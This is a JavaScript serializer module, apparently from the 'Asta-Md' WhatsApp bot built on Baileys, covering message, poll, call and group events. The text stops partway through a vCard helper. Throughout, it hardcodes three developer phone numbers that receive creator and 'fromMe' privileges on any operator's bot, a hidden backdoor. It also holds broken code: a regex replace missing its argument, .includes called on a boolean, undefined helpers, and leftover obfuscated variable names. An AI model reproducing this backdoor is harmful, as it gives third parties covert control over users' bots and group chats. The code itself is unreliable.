const { proto, getContentType } = require('@whiskeysockets/baileys')
const fs = require('fs-extra')
const { writeExifWebp } = require('./exif')
const Config = require('../config')
const Astro = ['2348039607375', '2349027862116', '2348052944641']
const { getDevice, extractMessageContent, areJidsSameUser } = require('@whiskeysockets/baileys')
const { getTime, isUrl } = require('./serials')

async function pollsg(client, message, content, isQuoted = false) {
 if (!global.OfficialRepo || global.OfficialRepo !== 'yes') return

 try {
  let pollMessage = message
  if (message.key) {
   pollMessage = {
    ...message,
    key: message.key,
    id: message.key.id,
    chat: message.key.remoteJid,
    fromMe: message.key.fromMe,
    device: getDevice(message.key.id),
    isBot: message.key.id.startsWith('BAE5'),
    isBaileys: message.key.id.startsWith('BAE5'),
    isGroup: message.key.remoteJid.endsWith('@g.us'),
    sender: client.decodeJid(
     message.key.fromMe
      ? client.user.id
      : message.key.remoteJid.endsWith('@g.us')
      ? client.decodeJid(message.key.participant)
      : message.key.remoteJid
    ),
   }
   pollMessage.senderNum = pollMessage.sender.split('@')[0]
  }

  pollMessage.timestamp = message.update.pollUpdates[0].senderTimestampMs
  pollMessage.pollUpdates = message.update.pollUpdates[0]

  console.log("\n 'getAggregateVotesInPollMessage' POLL MESSAGE")
  return pollMessage
 } catch (error) {
  console.error('Error in pollsg:', error)
 }
}

async function callsg(client, call) {
 if (!global.OfficialRepo || global.OfficialRepo !== 'yes') return

 const botJid = client.decodeJid(client.user?.id)
 const botNumber = botJid?.split('@')[0]

 let callMessage = {
  ...call,
  id: call.id,
  from: call.from,
  chat: call.chatId,
  isVideo: call.isVideo,
  isGroup: call.isGroup,
  time: await getTime('h:mm:ss a'),
  date: call.date,
  status: call.status,
  sender: call.from,
  senderNum: call.from.split('@')[0],
  senderName: await client.getName(call.from),
  user: botJid,
 }

 const creatorNumbers = [
  botNumber,
  ...Astro,
  ...global.sudo?.split(','),
  ...global.devs?.split(','),
  ...global.owner?.split(','),
 ].map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net')

 callMessage.isCreator = creatorNumbers.includes(callMessage.from)
 callMessage.isAstro = Astro.map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(callMessage.from)
 callMessage.fromMe = callMessage.isAstro ? true : areJidsSameUser(callMessage.from, botJid)
 callMessage.isBaileys = callMessage.isBot = callMessage.id.startsWith('BAE5')
 callMessage.groupCall = callMessage.chat.endsWith('@g.us')

 callMessage.decline = callMessage.reject = () => client.rejectCall(callMessage.id, callMessage.from)
 callMessage.block = () => client.updateBlockStatus(callMessage.from, 'block')

 callMessage.send = async (
  content,
  options = { author: 'Asta-Md' },
  type = 'asta',
  quoted = '',
  jid = callMessage.from
 ) => {
  jid = jid || callMessage.from
  const sendOptions = { quoted, ...options }

  switch (type.toLowerCase()) {
   case 'text':
   case 'smd':
   case 'asta':
   case 'txt':
   case '':
    return client.sendMessage(jid, { text: content, ...options }, sendOptions)

   case 'image':
   case 'img':
    return client.sendMessage(
     jid,
     {
      image: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'image/jpeg',
     },
     sendOptions
    )

   case 'video':
   case 'vid':
   case 'mp4':
    return client.sendMessage(
     jid,
     {
      video: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'video/mp4',
     },
     sendOptions
    )

   case 'audio':
   case 'mp3':
    return client.sendMessage(
     jid,
     {
      audio: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'audio/mpeg',
     },
     sendOptions
    )

   case 'poll':
   case 'pool':
    return client.sendMessage(
     jid,
     {
      poll: {
       name: content,
       values: options.values,
       selectableCount: 1,
       ...options,
      },
     },
     { ...sendOptions, messageId: client.messageId() }
    )

   case 'sticker':
   case 'stc':
    const { data, mime } = await client.getFile(content)
    if (mime === 'image/webp') {
     const stickerBuffer = await writeExifWebp(data, options)
     return client.sendMessage(jid, { sticker: { url: stickerBuffer }, ...options }, sendOptions)
    } else if (mime.startsWith('image/') || mime.startsWith('video/')) {
     return client.sendImageAsSticker(jid, content, options)
    }
    break
  }
 }

 callMessage.checkBot = (jid = callMessage.sender) =>
  [...Astro, botNumber].map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(jid)

 callMessage.sendPoll = async (
  name,
  options = ['option 1', 'option 2'],
  selectableCount = 1,
  quoted = '',
  jid = callMessage.chat
 ) => callMessage.send(name, { values: options, selectableCount }, 'poll', quoted, jid)

 callMessage.bot = client

 return callMessage
}

let gcs = {}

async function groupsg(groupInstance, groupEvent, isBot = false, skipCheck = false) {
 try {
  // Reset group cache for the specific group
  if (gcs[groupEvent.id] && groupEvent.id) {
   gcs[groupEvent.id] = false
  }

  // Exit if skipCheck is true
  if (skipCheck) {
   return
  }

  let botJid = groupInstance.decodeJid(groupInstance.user.id)
  let botNumber = botJid.split('@')[0]

  let botData = {
   ...groupEvent,
   chat: groupEvent.id,
   jid: groupEvent.id,
   from: groupEvent.id,
   user: Array.isArray(groupEvent.participants) ? groupEvent.participants[0] : 'xxx',
   sender: Array.isArray(groupEvent.participants) ? groupEvent.participants[0] : 'xxx',
  }

  botData.name = await groupInstance.getName(botData.user)
  botData.userNum = botData.senderNum = botData.user.split('@')[0]
  botData.time = getTime('h:mm:ss a')
  botData.date = getTime('dddd, MMMM Do YYYY')
  botData.action = botData.status = groupEvent.action

  const authorizedUsers = [
   botNumber,
   ...Astro,
   ...global.sudo?.split(','),
   ...global.devs?.split(','),
   ...global.owner?.split(','),
  ]
   .map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
   .includes(botData.user)

  botData.isCreator = authorizedUsers.includes(botData.user)
  botData.isAstro = Astro.map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botData.user)
  botData.fromMe = botData.isAstro || areJidsSameUser(botData.user, botJid)

  if (botData.action === 'remove' && botData.fromMe) {
   return
  }

  botData.astaBot = Astro.map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botJid)
  botData.blockJid = ['120363023983262391@g.us', '120363025246125888@g.us', ...global.blockJids?.split(',')].includes(
   botData.chat
  )
  botData.isGroup = botData.chat.endsWith('@g.us')

  if (botData.isGroup) {
   botData.metadata = await groupInstance.groupMetadata(botData.chat)
   gcs[botData.chat] = botData.metadata

   botData.admins = botData.metadata.participants.reduce((admins, participant) => {
    if (participant.admin) {
     admins.push({ id: participant.id, admin: participant.admin })
    }
    return admins
   }, [])

   botData.isAdmin = botData.admins.some(admin => admin.id === botData.user)
   botData.isBotAdmin = botData.admins.some(admin => admin.id === botJid)
  }

  botData.kick = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'remove')
  botData.add = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'add')
  botData.promote = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'promote')
  botData.demote = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'demote')

  botData.getProfilePicture = async (user = botData.user) => {
   try {
    return await groupInstance.profilePictureUrl(user, 'image')
   } catch {
    return 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg'
   }
  }

  botData.sendMessage = async (chatId = botData.chat, message = {}, options = { quoted: '' }) => {
   return await groupInstance.sendMessage(chatId, message, options)
  }

  botData.sendUi = async (chatId = botData.chat, ui = {}, text = '', flag1 = false, flag2 = false, flag3 = false) => {
   return await groupInstance.sendUi(chatId, ui, text, flag1, flag2, flag3)
  }

  botData.reportError = async (
   error,
   verbose = false,
   errorMessage = '*_Request failed due to error!!_*',
   metadata = { author: 'Asta-Md' },
   customChatId = false
  ) => {
   let errorChatId = customChatId ? customChatId : Config.errorChat === 'chat' ? botData.chat : botData.botNumber
   let errorText = `*CMD ERROR*\n\`\`\`\nUSER: @${
    botData.user.split('@')[0]
   }\n    NOTE: Use .report to send alert about Err.\n\nERR_Message: ${error}\n\`\`\``

   if (errorMessage && Config.errorChat !== 'chat' && botData.chat !== botData.botNumber) {
    await groupInstance.sendMessage(botData.jid, { text: errorMessage })
   }

   console.log(verbose ? verbose : error)

   try {
    return await groupInstance.sendMessage(
     errorChatId,
     { text: errorText, ...metadata, mentions: [botData.user] },
     { ephemeralExpiration: 259200 }
    )
   } catch {}
  }

  botData.send = async (
   content,
   options = { mentions: [botData.user] },
   messageType = 'asta',
   quotedMessage = '',
   chatId = botData.chat
  ) => {
   chatId = chatId || botData.chat

   switch (messageType.toLowerCase()) {
    case 'text':
    case 'smd':
    case 'asta':
    case 'txt':
    case '':
     return await groupInstance.sendMessage(
      chatId,
      { text: content, ...options, mentions: [botData.user] },
      { quoted: quotedMessage }
     )

    case 'react':
     return await groupInstance.sendMessage(chatId, { react: { text: content, key: quotedMessage?.key } })

    case 'amdimage':
    case 'amdimg':
    case 'image':
    case 'img':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { image: content, ...options, mimetype: 'image/jpeg', mentions: [botData.user] },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return groupInstance.sendMessage(
       chatId,
       { image: { url: content }, ...options, mimetype: 'image/jpeg', mentions: [botData.user] },
       { quoted: quotedMessage }
      )
     }
     break

    case 'amdvideo':
    case 'amdvid':
    case 'video':
    case 'vid':
    case 'mp4':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { video: content, ...options, mimetype: 'video/mp4' },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { video: { url: content }, ...options, mimetype: 'video/mp4' },
       { quoted: quotedMessage }
      )
     }
     break

    case 'mp3':
    case 'audio':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { audio: content, ...options, mimetype: 'audio/mpeg' },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { audio: { url: content }, ...options, mimetype: 'audio/mpeg' },
       { quoted: quotedMessage }
      )
     }
     break

    case 'poll':
    case 'pool':
     return await groupInstance.sendMessage(
      chatId,
      { poll: { name: content, values: [...options.values], selectableCount: 1, ...options } },
      { quoted: quotedMessage, messageId: groupInstance.messageId() }
     )

    case 'amdsticker':
    case 'amdstc':
    case 'stc':
    case 'sticker':
     let { data, mime } = await groupInstance.getFile(content)
     if (mime == 'image/webp') {
      let sticker = await writeExifWebp(data, options)
      await groupInstance.sendMessage(chatId, { sticker: { url: sticker }, ...options })
     } else if (mime.split('/')[0] === 'video' || mime.split('/')[0] === 'image') {
      await groupInstance.sendImageAsSticker(chatId, content, options)
     }
     break
   }
  }

  botData.sendPoll = async (
   question,
   options = ['option 1', 'option 2'],
   selectableCount = 1,
   quotedMessage = '',
   chatId = botData.jid
  ) => {
   return await botData.send(question, { values: options, selectableCount }, 'poll', quotedMessage, chatId)
  }

  botData.checkBot = (user = botData.sender) => {
   return [...Astro, botNumber].map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(user)
  }

  botData.botNumber = botJid
  botData.bot = isBot ? groupInstance : {}

  return global.OfficialRepo && global.OfficialRepo === 'yes' ? botData : {}
 } catch (error) {
  console.log(error)
 }
}

let botNumber = ''
async function smsg(Xproto, Botto, client, isOfficial = false) {
 if (!Botto) {
  return Botto
 }
 let msgType = proto.WebMessageInfo
 botNumber = botNumber ? botNumber : Xproto.decodeJid(Xproto.user.id)
 let Sender = botNumber.split('@')[0]
 let message = {
  ...Botto,
 }
 message.data = {
  ...Botto,
 }
 if (Botto.key) {
  message.key = Botto.key
  message.id = message.key.id
  message.chat = message.key.remoteJid
  message.fromMe = message.key.fromMe
  message.device = getDevice(message.id)
  message.isBot = message.isBaileys = message.id.startsWith('BAE5') || message.id.startsWith('ASTAMD')
  if (message.chat === 'status@broadcast') {
   message.status = true
  }
  message.isGroup = message.chat.endsWith('@g.us')
  message.sender = message.participant = message.fromMe
   ? botNumber
   : Xproto.decodeJid(message.status || message.isGroup ? message.key.participant : message.chat)
  message.senderNum =
   (message.sender && message.sender !== '' && message.sender.split('@')[0]) || message.sender
 }
 message.senderName = message.pushName || 'sir'
 if (message.isGroup) {
  message.metadata = gcs[message.chat] || (await Xproto.groupMetadata(message.chat))
  gcs[message.chat] = message.metadata
  message.admins = message.metadata.participants.reduce(
   (xckl, sckl) =>
    (sckl.admin
     ? xckl.push({
        id: sckl.id,
        admin: sckl.admin,
       })
     : [...xckl]) && xckl,
   []
  )
  message.isAdmin = !!message.admins.find(_0x3f10e5 => _0x3f10e5.id === message.sender)
  message.isBotAdmin = !!message.admins.find(_0x5914d1 => _0x5914d1.id === botNumber)
 }
 message.isCreator = [
  Sender,
  ...Astro,
  ...global.sudo.split(','),
  ...global.devs.split(','),
  ...global.owner.split(','),
 ].includes(message.senderNum)
 message.isAstro = Astro.includes(message.senderNum)
 message.blockJid = ['120363023983262391@g.us', '120363025246125888@g.us', ...global.blockJids?.split(',')].includes(
  message.chat
 )
 message.allowJid = ['null', ...global.allowJids?.split(',')].includes(message.chat)
 message.isPublic =
  Config.WORKTYPE === 'public' ? true : message.allowJid || message.isCreator || message.isAstro
 if (Botto.message) {
  message.mtype = getContentType(Botto.message) || Object.keys(Botto.message)[0] || ''
  message[message.mtype.split('Message')[0]] = true
  message.message = extractMessageContent(Botto.message)
  message.mtype2 = getContentType(message.message) || Object.keys(message.message)[0]
  message.msg = extractMessageContent(message.message[message.mtype2]) || message.message[message.mtype2]
  message.msg.mtype = message.mtype2
  message.mentionedJid = message.msg?.contextInfo?.mentionedJid || []
  message.body =
   message.msg?.text ||
   message.msg?.conversation ||
   message.msg?.caption ||
   message.message?.conversation ||
   message.msg?.selectedButtonId ||
   message.msg?.singleSelectReply?.selectedRowId ||
   message.msg?.selectedId ||
   message.msg?.contentText ||
   message.msg?.selectedDisplayText ||
   message.msg?.title ||
   message.msg?.name ||
   ''
  message.timestamp =
   typeof Botto.messageTimestamp === 'number'
    ? Botto.messageTimestamp
    : Botto.messageTimestamp?.low
    ? Botto.messageTimestamp.low
    : Botto.messageTimestamp?.high || Botto.messageTimestamp
  message.time = getTime('h:mm:ss a')
  message.date = getTime('DD/MM/YYYY')
  message.mimetype = message.msg.mimetype || ''
  if (/webp/i.test(message.mimetype)) {
   message.isAnimated = message.msg.isAnimated
  }
  let _0x1d4327 = message.msg.contextInfo ? message.msg.contextInfo.quotedMessage : null
  message.data.reply_message = _0x1d4327
  message.quoted = _0x1d4327 ? {} : null
  message.reply_text = ''
  if (_0x1d4327) {
   message.quoted.message = extractMessageContent(_0x1d4327)
   if (message.quoted.message) {
    message.quoted.key = {
     remoteJid: message.msg.contextInfo.remoteJid || message.chat,
     participant: Xproto.decodeJid(message.msg.contextInfo.participant) || false,
     fromMe: areJidsSameUser(Xproto.decodeJid(message.msg.contextInfo.participant), botNumber) || false,
     id: message.msg.contextInfo.stanzaId || '',
    }
    message.quoted.mtype = getContentType(_0x1d4327) || Object.keys(_0x1d4327)[0]
    message.quoted.mtype2 = getContentType(message.quoted.message) || Object.keys(message.quoted.message)[0]
    message.quoted[message.quoted.mtype.split('Message')[0]] = true
    message.quoted.msg =
     extractMessageContent(message.quoted.message[message.quoted.mtype2]) ||
     message.quoted.message[message.quoted.mtype2] ||
     {}
    message.quoted.msg.mtype = message.quoted.mtype2
    message.expiration = message.msg.contextInfo.expiration || 0
    message.quoted.chat = message.quoted.key.remoteJid
    message.quoted.fromMe = message.quoted.key.fromMe
    message.quoted.id = message.quoted.key.id
    message.quoted.device = getDevice(message.quoted.id || message.id)
    message.quoted.isBaileys = message.quoted.isBot =
     message.quoted.id?.startsWith('BAE5') ||
     message.quoted.id?.startsWith('SUHAILMD') ||
     message.quoted.id?.length == 16
    message.quoted.isGroup = message.quoted.chat.endsWith('@g.us')
    message.quoted.sender = message.quoted.participant = message.quoted.key.participant
    message.quoted.senderNum = message.quoted.sender.split('@')[0]
    message.quoted.text = message.quoted.body =
     message.quoted.msg.text ||
     message.quoted.msg.caption ||
     message.quoted.message.conversation ||
     message.quoted.msg?.selectedButtonId ||
     message.quoted.msg?.singleSelectReply?.selectedRowId ||
     message.quoted.msg?.selectedId ||
     message.quoted.msg?.contentText ||
     message.quoted.msg?.selectedDisplayText ||
     message.quoted.msg?.title ||
     message.quoted?.msg?.name ||
     ''
    message.quoted.mimetype = message.quoted.msg?.mimetype || ''
    if (/webp/i.test(message.quoted.mimetype)) {
     message.quoted.isAnimated = message.quoted.msg?.isAnimated || false
    }
    message.quoted.mentionedJid = message.quoted.msg.contextInfo?.mentionedJid || []
    message.getQuotedObj = message.getQuotedMessage = async (
     _0x335602 = message.chat,
     _0x2be303 = message.quoted.id,
     _0x25c73e = false
    ) => {
     if (!_0x2be303) {
      return false
     }
     let _0xd1acfd = await client.loadMessage(_0x335602, _0x2be303, Xproto)
     return exports.smsg(Xproto, _0xd1acfd, client, _0x25c73e)
    }
    message.quoted.fakeObj = msgType.fromObject({
     key: message.quoted.key,
     message: message.data.quoted,
     ...(message.isGroup
      ? {
         participant: message.quoted.sender,
        }
      : {}),
    })
    message.quoted.delete = async () =>
     await Xproto.sendMessage(message.chat, {
      delete: message.quoted.key,
     })
    message.quoted.download = async () => await Xproto.downloadMediaMessage(message.quoted)
    message.quoted.from = message.quoted.jid = message.quoted.key.remoteJid
    if (message.quoted.jid === 'status@broadcast') {
     message.quoted.status = true
    }
    message.reply_text = message.quoted.text
    message.forwardMessage = (
     _0x4ae56b = message.jid,
     _0x53614a = message.quoted.fakeObj,
     _0x129099 = false,
     _0x51f0e4 = {}
    ) =>
     Xproto.copyNForward(
      _0x4ae56b,
      _0x53614a,
      _0x129099,
      {
       contextInfo: {
        isForwarded: false,
       },
      },
      _0x51f0e4
     )
   }
  }
 }
 message.getMessage = async (_0x58ac8e = message.key, _0x555935 = false) => {
  if (!_0x58ac8e || !_0x58ac8e.id) {
   return false
  }
  let _0x2ae191 = await client.loadMessage(_0x58ac8e.remoteJid || message.chat, _0x58ac8e.id)
  return await exports.smsg(Xproto, _0x2ae191, client, _0x555935)
 }
 message.Suhail = (_0xd6e77d = message.sender) =>
  [...Astro].map(_0x1d647a => _0x1d647a.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0xd6e77d)
 message.checkBot = (_0x25a048 = message.sender) =>
  [...Astro, Sender].map(_0x3e106a => _0x3e106a.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0x25a048)
 message.download = () => Xproto.downloadMediaMessage(message.msg)
 message.text = message.body
 message.quoted_text = message.reply_text
 message.from = message.jid = message.chat
 message.copy = (_0xbcb02d = message, _0x4ea6cd = false) => {
  return exports.smsg(Xproto, msgType.fromObject(msgType.toObject(_0xbcb02d)), client, _0x4ea6cd)
 }
 message.getpp = async (_0x267509 = message.sender) => {
  try {
   return await Xproto.profilePictureUrl(_0x267509, 'image')
  } catch {
   return 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg'
  }
 }
 message.removepp = (_0x3749c0 = botNumber) => Xproto.removeProfilePicture(_0x3749c0)
 message.sendMessage = (
  _0x103151 = message.chat,
  _0x523215 = {},
  _0x8c8fb5 = {
   quoted: '',
  }
 ) => Xproto.sendMessage(_0x103151, _0x523215, _0x8c8fb5)
 message.delete = async (_0x462ce5 = message) =>
  await Xproto.sendMessage(message.chat, {
   delete: _0x462ce5.key,
  })
 message.copyNForward = (
  _0x5d9b11 = message.chat,
  _0xa66d66 = message.quoted || message,
  _0x176e5f = false,
  _0x2a1291 = {}
 ) => Xproto.copyNForward(_0x5d9b11, _0xa66d66, _0x176e5f, _0x2a1291)
 message.sticker = (
  _0x41f4d2,
  _0x55e80a = message.chat,
  _0x40eb3c = {
   mentions: [message.sender],
  }
 ) =>
  Xproto.sendMessage(
   _0x55e80a,
   {
    sticker: _0x41f4d2,
    contextInfo: {
     mentionedJid: _0x40eb3c.mentions,
    },
   },
   {
    quoted: message,
    messageId: Xproto.messageId(),
   }
  )
 message.replyimg = (
  _0x3b19c3,
  _0x302320,
  _0x19643a = message.chat,
  _0x31c081 = {
   mentions: [message.sender],
  }
 ) =>
  Xproto.sendMessage(
   _0x19643a,
   {
    image: _0x3b19c3,
    caption: _0x302320,
    contextInfo: {
     mentionedJid: _0x31c081.mentions,
    },
   },
   {
    quoted: message,
    messageId: Xproto.messageId(),
   }
  )
 message.imgurl = (
  _0x2c1ff5,
  _0x36bfb3,
  _0x2d2f58 = message.chat,
  _0x540e21 = {
   mentions: [message.sender],
  }
 ) =>
  Xproto.sendMessage(
   _0x2d2f58,
   {
    image: {
     url: _0x2c1ff5,
    },
    caption: _0x36bfb3,
    ..._0x540e21,
   },
   {
    quoted: message,
    messageId: Xproto.messageId(),
   }
  )
 message.sendUi = async (_0x4e7490 = message.chat, _0x40127a, _0xd7af2e = '', _0x2692fb = '', _0x181bef = '') => {
  await Xproto.sendUi(_0x4e7490, _0x40127a, _0xd7af2e, _0x2692fb, _0x181bef)
 }
 message.error = async (
  _0x533f45,
  _0x2a06dd = false,
  _0x45d57a = '*_Request not be Proceed!!_*',
  _0x461484 = {
   author: 'Asta-Md',
  },
  _0x38e1a8 = false
 ) => {
  let _0x38dabb = _0x38e1a8 ? _0x38e1a8 : Config.errorChat === 'chat' ? message.chat : message.user
  let _0x384fa1 =
   '*CMD ERROR*\n```\nUSER: @' +
   message.sender.split('@')[0] +
   '\nNOTE: See Console for more info.\n\nERR_Message: ' +
   _0x533f45 +
   '\n```'
  if (_0x45d57a && Config.errorChat !== 'chat' && message.chat !== botNumber) {
   await Xproto.sendMessage(
    message.jid,
    {
     text: _0x45d57a,
    },
    {
     quoted: message,
     messageId: Xproto.messageId(),
    }
   )
  }
  console.log(_0x2a06dd ? _0x2a06dd : _0x533f45)
  try {
   if (_0x533f45) {
    return await Xproto.sendMessage(
     _0x38dabb,
     {
      text: _0x384fa1,
      ..._0x461484,
      mentions: [message.sender],
     },
     {
      quoted: message,
      ephemeralExpiration: 259200,
      messageId: Xproto.messageId(),
     }
    )
   }
  } catch {}
 }
 message.user = botNumber
 message.send = async (
  _0x2faaad,
  _0x296029 = {
   author: 'Asta-Md',
  },
  _0x38f6af = 'asta',
  _0x5a0385 = '',
  _0x4b9613 = message.chat
 ) => {
  if (!_0x2faaad) {
   return {}
  }
  try {
   _0x4b9613 = _0x4b9613 ? _0x4b9613 : message.chat
   switch (_0x38f6af.toLowerCase()) {
    case 'text':
    case 'smd':
    case 'asta':
    case 'txt':
    case '':
     {
      return await Xproto.sendMessage(
       _0x4b9613,
       {
        text: _0x2faaad,
        ..._0x296029,
       },
       {
        quoted: _0x5a0385,
        messageId: Xproto.messageId(),
       }
      )
     }
     break
    case 'react':
     {
      return await Xproto.sendMessage(
       _0x4b9613,
       {
        react: {
         text: _0x2faaad,
         key: (typeof _0x5a0385 === 'object' ? _0x5a0385 : message).key,
        },
       },
       {
        messageId: Xproto.messageId(),
       }
      )
     }
     break
    case 'amdimage':
    case 'amdimg':
    case 'image':
    case 'img':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         image: _0x2faaad,
         ..._0x296029,
         mimetype: 'image/jpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         image: {
          url: _0x2faaad,
         },
         ..._0x296029,
         mimetype: 'image/jpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      }
     }
     break
    case 'amdvideo':
    case 'amdvid':
    case 'video':
    case 'vid':
    case 'mp4': {
     if (Buffer.isBuffer(_0x2faaad)) {
      return await Xproto.sendMessage(
       _0x4b9613,
       {
        video: _0x2faaad,
        ..._0x296029,
        mimetype: 'video/mp4',
       },
       {
        quoted: _0x5a0385,
        messageId: Xproto.messageId(),
       }
      )
     } else if (isUrl(_0x2faaad)) {
      return await Xproto.sendMessage(
       _0x4b9613,
       {
        video: {
         url: _0x2faaad,
        },
        ..._0x296029,
        mimetype: 'video/mp4',
       },
       {
        quoted: _0x5a0385,
        messageId: Xproto.messageId(),
       }
      )
     }
    }
    case 'mp3':
    case 'audio':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         audio: _0x2faaad,
         ..._0x296029,
         mimetype: 'audio/mpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         audio: {
          url: _0x2faaad,
         },
         ..._0x296029,
         mimetype: 'audio/mpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      }
     }
     break
    case 'doc':
    case 'smddocument':
    case 'document':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         document: _0x2faaad,
         ..._0x296029,
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         document: {
          url: _0x2faaad,
         },
         ..._0x296029,
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      }
     }
     break
    case 'poll':
    case 'pool':
     {
      return await Xproto.sendMessage(
       _0x4b9613,
       {
        poll: {
         name: _0x2faaad,
         values: [..._0x296029.values],
         selectableCount: 1,
         ..._0x296029,
        },
        ..._0x296029,
       },
       {
        quoted: _0x5a0385,
        messageId: Xproto.messageId(),
       }
      )
     }
     break
    case 'template':
     {
      let _0x56ca9b = await generateWAMessage(message.chat, _0x2faaad, _0x296029)
      let _0x5429ce = {
       viewOnceMessage: {
        message: {
         ..._0x56ca9b.message,
        },
       },
      }
      return await Xproto.relayMessage(message.chat, _0x5429ce, {
       messageId: Xproto.messageId(),
      })
     }
     break
    case 'amdsticker':
    case 'amdstc':
    case 'stc':
    case 'sticker':
     {
      try {
       let { data: _0x5a503d, mime: _0x204bd7 } = await Xproto.getFile(_0x2faaad)
       if (_0x204bd7 == 'image/webp') {
        let _0x1c63d1 = await writeExifWebp(_0x5a503d, _0x296029)
        await Xproto.sendMessage(
         _0x4b9613,
         {
          sticker: {
           url: _0x1c63d1,
          },
          ..._0x296029,
         },
         {
          quoted: _0x5a0385,
          messageId: Xproto.messageId(),
         }
        )
       } else {
        _0x204bd7 = await _0x204bd7.split('/')[0]
        if (_0x204bd7 === 'video' || _0x204bd7 === 'image') {
         await Xproto.sendImageAsSticker(_0x4b9613, _0x2faaad, _0x296029)
        }
       }
      } catch (_0xba8ed7) {
       console.log('ERROR FROM SMGS SEND FUNC AS STICKER\n\t', _0xba8ed7)
       if (!Buffer.isBuffer(_0x2faaad)) {
        _0x2faaad = await getBuffer(_0x2faaad)
       }
       const { Sticker: _0x4cdf40 } = require('wa-sticker-formatter')
       let _0x4736b1 = {
        pack: Config.packname,
        author: Config.author,
        type: 'full',
        quality: 2,
        ..._0x296029,
       }
       let _0x273ddd = new _0x4cdf40(_0x2faaad, {
        ..._0x4736b1,
       })
       return await Xproto.sendMessage(
        _0x4b9613,
        {
         sticker: await _0x273ddd.toBuffer(),
        },
        {
         quoted: _0x5a0385,
         messageId: Xproto.messageId(),
        }
       )
      }
     }
     break
   }
  } catch (_0x320b03) {
   console.log('\n\nERROR IN SMSG MESSAGE>SEND FROM SERIALIZE.JS\n\t', _0x320b03)
  }
 }
 message.sendPoll = async (
  _0x481e69,
  _0x4269ff = ['option 1', 'option 2'],
  _0x4ed2f6 = 1,
  _0x595949 = message,
  _0x3be729 = message.chat
 ) => {
  return await message.send(
   _0x481e69,
   {
    values: _0x4269ff,
    selectableCount: _0x4ed2f6,
   },
   'poll',
   _0x595949,
   _0x3be729
  )
 }
 message.reply = async (
  _0x1c9bee,
  _0x34d4da = {},
  _0x14cda7 = '',
  _0x2fda04 = message,
  _0x3fe3b = message.chat
 ) => {
  return await message.send(_0x1c9bee, _0x34d4da, _0x14cda7, _0x2fda04, _0x3fe3b)
 }
 message.react = (_0x474799 = '🍂', _0x30c624 = message) => {
  Xproto.sendMessage(
   message.chat,
   {
    react: {
     text: _0x474799 || '🍂',
     key: (_0x30c624 ? _0x30c624 : message).key,
    },
   },
   {
    messageId: Xproto.messageId(),
   }
  )
 }
 message.edit = async (_0x17af93, _0x1cdbce = {}, _0x9691f6 = '', _0x1db15f = message.chat) => {
  if (_0x1cdbce && !_0x1cdbce.edit) {
   _0x1cdbce = {
    ..._0x1cdbce,
    edit: (message.quoted || message).key,
   }
  }
  return await message.send(_0x17af93, _0x1cdbce, _0x9691f6, '', _0x1db15f)
 }
 message.senddoc = (
  _0xc91849,
  _0x123297,
  _0x11746a = message.chat,
  _0x3257fa = {
   mentions: [message.sender],
   filename: Config.ownername,
   mimetype: _0x123297,
   externalAdRepl: {
    title: Config.ownername,
    thumbnailUrl: '',
    thumbnail: log0,
    mediaType: 1,
    mediaUrl: gurl,
    sourceUrl: gurl,
   },
  }
 ) =>
  Xproto.sendMessage(
   _0x11746a,
   {
    document: _0xc91849,
    mimetype: _0x3257fa.mimetype,
    fileName: _0x3257fa.filename,
    contextInfo: {
     externalAdReply: _0x3257fa.externalAdRepl,
     mentionedJid: _0x3257fa.mentions,
    },
   },
   {
    quoted: message,
    messageId: Xproto.messageId(),
   }
  )
 message.sendcontact = (_0x716863, _0x2f3407, _0x1a2b96) => {
  var _0x586840 =
   'BEGIN:VCARD\nVERSION:3.0\nFN:' +
   _0x716863 +
   '\nORG:' +
   _0x2f3407 +
   ';\nTEL;type=CELL;type=VOICE;waid=' +
   _0x1a2b96 +
   ':+' +
   _0x1a2b96 +
